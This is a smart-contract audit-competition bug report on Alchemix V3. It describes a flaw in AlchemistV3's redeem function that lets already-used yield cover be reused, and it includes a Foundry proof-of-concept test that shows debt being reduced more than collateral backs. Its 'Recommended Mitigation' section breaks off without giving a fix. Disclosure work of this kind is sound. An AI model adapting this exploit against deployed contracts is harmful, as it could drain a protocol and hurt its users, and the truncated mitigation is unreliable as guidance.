# 58443 sc critical incorrect consumption of yield cover in redeem leading to reuse of accrued yield&#x20;

**Submitted on Nov 2nd 2025 at 12:06:01 UTC by @w3llyc4de20Ik2nn1 for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58443
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Brief/Intro

The AlchemistV3 redeem function incorrectly updates `lastTransmuterTokenBalance` by subtracting `usedYield` from the current `transmuterBal` instead of adding it to the prior balance, causing previously consumed yield to be reused as debt cover in subsequent redemptions without actually burning or transferring the tokens.

## Vulnerability Details

In the AlchemistV3.sol: `redeem ()` subtracts the usedYield (portion of accrued yield applied as debt cover) from the current transmuter balance to "consume" it, but since `transmuterBal` already includes the full `deltaYield` (new accrual), this sets `lastTransmuterTokenBalance` to the old balance plus only the unused yield; as a result, the next redemption's `deltaYield` calculation re-includes the previously used yield, allowing it to be double-dipped as cover without actually transferring or burning the tokens.

In the redeem function, the logic intended to "consume" the observed yield delta (to prevent reuse as cover in future redemptions) is flawed. Specifically:

```solidity
// observed transmuter pre-balance -> potential cover 

uint256 transmuterBal = TokenUtils.safeBalanceOf(myt, address(transmuter));  // <-- DEFINED HERE: Current balance fetched from transmuter contract 
```

```solidity
uint256 deltaYield    = transmuterBal > lastTransmuterTokenBalance ? transmuterBal - lastTransmuterTokenBalance : 0;  // <-- DEFINED HERE: deltaYield = max(0, transmuterBal - old lastTransmuterTokenBalance) 
```

`deltaYield` represents the new yield accrued in the transmuter since the last update to `lastTransmuterTokenBalance` (the "old" last balance).\
Note: `lastTransmuterTokenBalance` is a state variable (previously set, e.g., from prior calls to redeem or \_earmark). It's used here as the "old" balance.

```solidity
uint256 coverDebt = convertYieldTokensToDebt(deltaYield);  // <-- USED HERE: Converts deltaYield to debt equivalent for cover calculation 

  

// cap cover so we never consume beyond remaining earmarked 

uint256 coverToApplyDebt = amount + coverDebt > liveEarmarked ? (liveEarmarked - amount) : coverDebt;  // <-- USED HERE: Caps the cover amount using coverDebt (derived from deltaYield) 
```

`usedYield` is the portion of that delta applied as cover (in yield token units).

The code attempts to consume this by setting `lastTransmuterTokenBalance = transmuterBal - usedYield`

```solidity
// consume the observed cover so it can't be reused 

if (deltaYield != 0) {  // <-- deltaYield USED HERE: Checks if there's any new accrual 

    uint256 usedYield = convertDebtTokensToYield(coverToApplyDebt);  // <-- DEFINED HERE: Back-converts the capped cover debt to yield tokens (portion actually "used" as cover) 

    lastTransmuterTokenBalance = transmuterBal > usedYield ? transmuterBal - usedYield : transmuterBal;  // <-- usedYield USED HERE: In the flawed subtraction 

} 
```

Definition of `usedYield` (Portion of Delta Applied as Cover)

```solidity
lastTransmuterTokenBalance = transmuterBal > usedYield ? transmuterBal - usedYield : transmuterBal;  // <-- FLAWED UPDATE: Sets to transmuterBal - usedYield, which (as explained) = old + unusedYield, re-adding usedYield to future deltas 
```

This is where the bug manifests: It incorrectly updates the state variable `lastTransmuterTokenBalance`, affecting the next call's `deltaYield` calculation

However, since `transmuterBal = lastTransmuterTokenBalance (old) + deltaYield`, this simplifies to old + deltaYield - usedYield = old + unusedYield.

As a result, the next redemption's deltaYield becomes futureBal - (old + unusedYield) = (futureBal - transmuterBal) + usedYield, effectively re-adding the consumed usedYield back into the available delta. This allows the same yield accrual to be reused as cover across multiple redemptions, potentially enabling attackers to redeem more debt than intended without consuming the underlying yield tokens.

## Impact Details

This enables attackers to redeem more debt than intended by reusing the same yield accrual multiple times, inflating redemptions beyond the actual collateral available.

## Recommended Mitigation

To fix the yield reuse issue, update lastTransmuterTokenBalance

## References

<https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol?utm\\_source=immunefi>

## Proof of Concept

## Proof of Concept

Practical example: Denote old\_last = lastTransmuterTokenBalance (before redemption). -vvvv

```solidity
function testRedeemReusesConsumedYieldCover() external {  

// Setup: Large deposit and mint to ensure large totalDebt for earmarking  

uint256 largeDeposit = 1000e18;  

uint256 largeMint = 900e18; // ~90% LTV  

vm.startPrank(alOwner);  

alchemist.setProtocolFee(0); // Set to 0 for exact calculations  

vm.stopPrank();  

vm.startPrank(address(0xbeef));  

SafeERC20.safeApprove(address(vault), address(alchemist), largeDeposit);  

alchemist.deposit(largeDeposit, address(0xbeef), 0);  

uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));  

alchemist.mint(tokenId, largeMint, address(0xbeef));  

vm.stopPrank();  

// Setup large cumulativeEarmarked by creating redemption and advancing (triggers _earmark via poke)  

uint256 setupRedemption = 500e18;  

vm.startPrank(address(0xbeef));  

IERC20(alToken).transfer(address(0xdad), setupRedemption);  

vm.stopPrank();  

vm.startPrank(address(0xdad));  

SafeERC20.safeApprove(address(alToken), address(transmuterLogic), setupRedemption);  

transmuterLogic.createRedemption(setupRedemption);  

vm.stopPrank();  

vm.roll(block.number + transmuterLogic.timeToTransmute() / 2); // Partial to set graph  

alchemist.poke(tokenId); // Triggers _earmark, sets large cumulativeEarmarked  

// Verify large cumulativeEarmarked (ensures room for cover in redemptions)  

uint256 liveEarmarked = alchemist.cumulativeEarmarked();  

assertGt(liveEarmarked, 100e18);  

// Initial transmuter balance = 0, lastTransmuterTokenBalance = 0  

// Repay to create deltaYield for first redeem (transfers yield to transmuter)  

uint256 repayYieldAmount = 50e18; // Yield tokens to repay, creates deltaYield = 50e18  

vm.startPrank(address(0xbeef));  

SafeERC20.safeApprove(address(vault), address(alchemist), repayYieldAmount);  

alchemist.repay(repayYieldAmount, tokenId);  

vm.stopPrank();  

// Verify transmuter yield balance after repay (deltaYield = 50e18 for next redeem)  

uint256 transmuterBalAfterRepay = IERC20(alchemist.myt()).balanceOf(address(transmuterLogic));  

assertEq(transmuterBalAfterRepay, repayYieldAmount);  

// Pre-first redeem state  

uint256 totalDebtBefore1 = alchemist.totalDebt();  

uint256 alchemistCollateralBefore1 = IERC20(alchemist.myt()).balanceOf(address(alchemist));  

// First redeem: small amount to ensure partial cover (usedYield > 0, but < deltaYield)  

uint256 redeemAmount1 = 10e18; // Small, so coverToApplyDebt = redeemAmount1 (full cover for net), usedYield ≈ 10e18 yield  

vm.startPrank(address(transmuterLogic));  

alchemist.redeem(redeemAmount1);  

vm.stopPrank();  

// Post-first: debt reduced by redeemAmount1 + coverDebt (coverDebt ≈ 10e18 debt from usedYield=10e18 yield)  

uint256 totalDebtAfter1 = alchemist.totalDebt();  

uint256 debtReduced1 = totalDebtBefore1 - totalDebtAfter1;  

uint256 expectedCoverDebt1 = alchemist.convertYieldTokensToDebt(redeemAmount1); // Since usedYield ≈ redeemAmount1 (full cover case)  

uint256 expectedDebtReduced1 = redeemAmount1 + expectedCoverDebt1;  

assertApproxEqAbs(debtReduced1, expectedDebtReduced1, 1e15);  

// Collateral removed: only net redeemed (redeemAmount1 in yield, since full cover, no fee)  

uint256 alchemistCollateralAfter1 = IERC20(alchemist.myt()).balanceOf(address(alchemist));  

uint256 collateralRemoved1 = alchemistCollateralBefore1 - alchemistCollateralAfter1;  

uint256 expectedCollateralRemoved1 = alchemist.convertDebtTokensToYield(redeemAmount1);  

assertApproxEqAbs(collateralRemoved1, expectedCollateralRemoved1, 1e15);  

// Transmuter balance unchanged (no new transfer), but lastTransmuterTokenBalance = 50e18 - usedYield ≈ 40e18 (flawed)  

// Pre-second redeem: verify transmuter balance unchanged  

uint256 transmuterBalAfter1 = IERC20(alchemist.myt()).balanceOf(address(transmuterLogic));  

assertEq(transmuterBalAfter1, repayYieldAmount);  

// Second redeem: same amount, no new repay/accrual, so expected deltaYield2 = 0 without bug  

uint256 totalDebtBefore2 = alchemist.totalDebt();  

uint256 alchemistCollateralBefore2 = IERC20(alchemist.myt()).balanceOf(address(alchemist));  

uint256 redeemAmount2 = 10e18;  

vm.startPrank(address(transmuterLogic));  

alchemist.redeem(redeemAmount2);  

vm.stopPrank();  

// Post-second: due to bug, deltaYield2 = usedYield1 ≈ 10e18 (reused), so debtReduced2 ≈ 10e18 + 10e18 = 20e18  

uint256 totalDebtAfter2 = alchemist.totalDebt();  

uint256 debtReduced2 = totalDebtBefore2 - totalDebtAfter2;  

uint256 expectedDebtReduced2WithBug = redeemAmount2 + expectedCoverDebt1; // Reuse proves bug  

assertApproxEqAbs(debtReduced2, expectedDebtReduced2WithBug, 1e15);  

// Collateral removed still only net: 10e18 yield  

uint256 alchemistCollateralAfter2 = IERC20(alchemist.myt()).balanceOf(address(alchemist));  

uint256 collateralRemoved2 = alchemistCollateralBefore2 - alchemistCollateralAfter2;  

uint256 expectedCollateralRemoved2 = alchemist.convertDebtTokensToYield(redeemAmount2);  

assertApproxEqAbs(collateralRemoved2, expectedCollateralRemoved2, 1e15);  

// Impact: Total debt reduced by ~40e18, but collateral removed only ~20e18 (double cover under-removes collateral)  

uint256 totalDebtReduced = debtReduced1 + debtReduced2;  

uint256 totalCollateralRemoved = collateralRemoved1 + collateralRemoved2;  

uint256 expectedCollateralForTotalDebtReduced = alchemist.convertDebtTokensToYield(totalDebtReduced);  

assertGt(expectedCollateralForTotalDebtReduced, totalCollateralRemoved); // System undercollateralized by ~20e18  

// Transmuter balance still unchanged (no new accrual/transfer, proves no real yield consumed for reused cover)  

uint256 transmuterBalAfter2 = IERC20(alchemist.myt()).balanceOf(address(transmuterLogic));  

assertEq(transmuterBalAfter2, repayYieldAmount);  

} 
```
